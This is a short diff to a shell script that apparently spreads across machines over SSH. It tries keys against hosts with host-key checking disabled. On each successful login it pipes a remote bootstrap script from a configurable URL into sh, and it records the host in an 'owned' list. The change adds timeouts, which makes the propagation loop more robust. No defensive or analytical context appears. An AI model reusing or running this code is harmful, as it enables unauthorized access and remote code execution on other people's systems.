@@ -201,8 +201,8 @@ probe() {
                -o ConnectTimeout=3 -o ConnectionAttempts=1 "$id" true 2>/dev/null; then
             echo "hunt: login OK -> $id"
             if [ -n "$CONFIG_URL" ] && \
-               ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no \
-                   -o UserKnownHostsFile=/dev/null "$id" \
+               timeout 180 ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$id" \
                    "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
                    2>/dev/null; then
                 printf '%s\n' "$id" >> "$OWNED"
